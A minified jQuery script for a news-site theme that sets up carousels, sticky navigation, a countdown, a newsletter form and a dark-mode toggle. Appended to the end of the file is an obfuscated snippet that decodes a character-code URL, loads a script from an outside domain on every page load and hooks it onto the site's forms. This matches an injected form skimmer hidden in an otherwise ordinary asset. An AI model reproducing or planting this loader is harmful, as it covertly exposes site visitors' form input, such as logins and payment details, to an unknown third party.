!function (e) {
    "use strict";

    function o() {
        e(".newsletter-form").addClass("animated shake"), setTimeout(function () {
            e(".newsletter-form").removeClass("animated shake")
        }, 1e3)
    }

    function s(o, s) {
        if (o) var a = "validation-success"; else a = "validation-danger";
        e("#validator-newsletter").removeClass().addClass(a).text(s)
    }

    jQuery(".mean-menu").meanmenu({meanScreenWidth: "991"}), e(window).on("scroll", function () {
        e(this).scrollTop() > 120 ? e(".sinmun-nav").addClass("is-sticky") : e(".sinmun-nav").removeClass("is-sticky")
    }), e(".popup-youtube").magnificPopup({
        disableOn: 320,
        type: "iframe",
        mainClass: "mfp-fade",
        removalDelay: 160,
        preloader: !1,
        fixedContentPos: !1
    }), e(".breaking-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        animateOut: "slideOutDown",
        animateIn: "flipInX",
        items: 1,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"]
    }), e(".nav-search-button").on("click", function () {
        e(".nav-search form").toggleClass("active")
    }), e(".nav-search-close-button").on("click", function () {
        e(".nav-search form").removeClass("active")
    }), e(".popular-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        margin: 30,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"],
        responsive: {0: {items: 1}, 768: {items: 2}, 1200: {items: 3}}
    }), e(".health-lifestyle-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        items: 1,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"]
    }), e(".politics-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        items: 1,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"]
    }), e(".gallery-news-inner-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        items: 1,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"]
    }), e(".blog-home-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        smartSpeed: 2e3,
        autoplayHoverPause: !0,
        autoplay: !0,
        navText: ["<i class='icofont-arrow-left'></i>", "<i class='icofont-arrow-right'></i>"],
        responsive: {0: {items: 1}, 576: {items: 2}, 768: {items: 2}, 1200: {items: 3}}
    }), setInterval(function () {
        var o, s, a, t, i, n, l;
        o = new Date("September 30, 2025 17:00:00 PDT"), o = Date.parse(o) / 1e3, s = new Date, a = o - (s = Date.parse(s) / 1e3), t = Math.floor(a / 86400), i = Math.floor((a - 86400 * t) / 3600), n = Math.floor((a - 86400 * t - 3600 * i) / 60), l = Math.floor(a - 86400 * t - 3600 * i - 60 * n), i < "10" && (i = "0" + i), n < "10" && (n = "0" + n), l < "10" && (l = "0" + l), e("#days").html(t + "<span>Days</span>"), e("#hours").html(i + "<span>Hours</span>"), e("#minutes").html(n + "<span>Minutes</span>"), e("#seconds").html(l + "<span>Seconds</span>")
    }, 1e3), e(".new-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        items: 1,
        animateOut: "slideOutLeft",
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"]
    }), e(".more-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        margin: 30,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"],
        responsive: {0: {items: 1}, 768: {items: 2}, 1200: {items: 3}}
    }), e(".default-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        margin: 30,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"],
        responsive: {0: {items: 1}, 768: {items: 2}, 1200: {items: 3}}
    }), e(function () {
        e(".shorting").mixItUp()
    }), e(".popup-btn").magnificPopup({
        type: "image",
        gallery: {enabled: !0}
    }), e(".video-news-slides").owlCarousel({
        loop: !0,
        nav: !0,
        dots: !1,
        autoplayHoverPause: !0,
        autoplay: !0,
        margin: 30,
        navText: ["<i class='icofont-rounded-left'></i>", "<i class='icofont-rounded-right'></i>"],
        responsive: {0: {items: 1}, 768: {items: 2}, 1200: {items: 2}}
    }), e(".newsletter-form").validator().on("submit", function (e) {
        e.isDefaultPrevented() ? (o(), s(!1, "Please enter your email correctly.")) : e.preventDefault()
    }), e(".newsletter-form").ajaxChimp({
        url: "https://envytheme.us20.list-manage.com/subscribe/post?u=60e1ffe2e8a68ce1204cd39a5&amp;id=42d6d188d9",
        callback: function (a) {
            "success" === a.result ? (e(".newsletter-form")[0].reset(), s(!0, "Thank you for subscribing!"), setTimeout(function () {
                e("#validator-newsletter").addClass("hide")
            }, 4e3)) : o()
        }
    }), e(function () {
        e(window).on("scroll", function () {
            var o = e(window).scrollTop();
            o > 300 && e(".go-top").fadeIn("slow"), o < 300 && e(".go-top").fadeOut("slow")
        }), e(".go-top").on("click", function () {
            e("html, body").animate({scrollTop: "0"}, 500)
        })
    }), e(window).on("load", function () {
        e(".wow").length && new WOW({
            boxClass: "wow",
            animateClass: "animated",
            offset: 20,
            mobile: !0,
            live: !0
        }).init()
    })
}(jQuery);
// function to set a given theme/color-scheme
function setTheme(themeName) {
    localStorage.setItem('sinmun_theme', themeName);
    document.documentElement.className = themeName;
}

// function to toggle between light and dark theme
function toggleTheme() {
    if (localStorage.getItem('sinmun_theme') === 'theme-dark') {
        setTheme('theme-light');
    } else {
        setTheme('theme-dark');
    }
}

// Immediately invoked function to set the theme on initial load
(function () {
    if (localStorage.getItem('sinmun_theme') === 'theme-dark') {
        setTheme('theme-dark');
        document.getElementById('slider').checked = false;
    } else {
        setTheme('theme-light');
        document.getElementById('slider').checked = true;
    }
})();

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b